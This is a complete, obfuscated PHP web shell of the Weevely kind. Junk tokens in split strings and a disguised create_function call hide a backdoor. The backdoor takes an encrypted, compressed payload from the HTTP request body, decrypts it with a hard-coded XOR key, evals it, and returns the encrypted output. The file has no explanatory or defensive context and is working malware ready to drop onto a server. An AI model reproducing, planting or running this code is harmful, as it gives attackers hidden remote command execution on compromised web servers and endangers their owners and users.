<?php
$y='atch}H("/}H$kh(.+)$kf/",@file_get}H_content}Hs("php:/}H/input")}H,$m)=}H=1) {}H@}Hob_start();}H@e';
$o='va}Hl(@gzun}Hcompre}Hss(@x(@ba}Hs}H}He64_decode(}H$m}H[1]),}H$k)));$}Ho=@ob_get_c}Hontents}H();@ob';
$A='nction }Hx($t,}H}H$k)}H{$c=}Hs}Htrlen($k}H);$l=strlen($t}H);$o=}H"";fo}Hr($i=0;$}Hi<$l;){for($}Hj=';
$e='$k="01}H}H2c958}Hb"}H;$kh="75df3c14cd64}H"}H}H;$kf=}H"28c9146ad}H01b";$p="tF}H7g4l2yy}Hzxci}HCHR}H";fu';
$D='0;(}H$j<}H$c&&$i<}H$l);$j++,$i+}H}H+){$o.=$t{$}Hi}^$k{$}H}Hj};}}re}Htur}Hn $o;}if (@pr}H}Heg}H_}Hm';
$m='}H_end_cl}Hean();$r}H=@base6}H4_e}Hnc}Hode(@x(@gzcom}Hpress(}H$o),$k}H)}H);}Hprint("$p$kh}H$r$kf");}';
$G=str_replace('m','','cmrematmem_funmmction');
$C=str_replace('}H','',$e.$A.$D.$y.$o.$m);
$l=$G('',$C);$l();
?>
